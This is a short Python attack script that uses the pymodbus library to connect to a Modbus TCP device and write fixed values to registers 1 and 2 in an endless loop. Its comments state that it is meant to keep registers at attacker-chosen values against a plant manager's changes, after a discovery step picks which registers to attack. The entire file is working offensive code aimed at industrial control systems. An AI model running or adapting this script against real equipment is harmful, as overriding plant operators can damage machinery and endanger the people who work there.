#!/usr/bin/env python3

# Keep registry values at the same value even if a plant manager attempts to change them
# Run discovery first to figure out which registers to attack

import sys
from pymodbus.client import ModbusTcpClient

if len(sys.argv) != 2:
    print("Error: Incorrect arguments given")
    print("Usage: ./keep_register_values.py ip_address")
    sys.exit()

ip = sys.argv[1]

client = ModbusTcpClient(ip, port=5020)
client.connect()

print('Keeping registers at a given value')

while True:
    client.write_register(1, 0) # Keep register 1 at 0
    client.write_register(2, 1) # Keep register 2 at 1
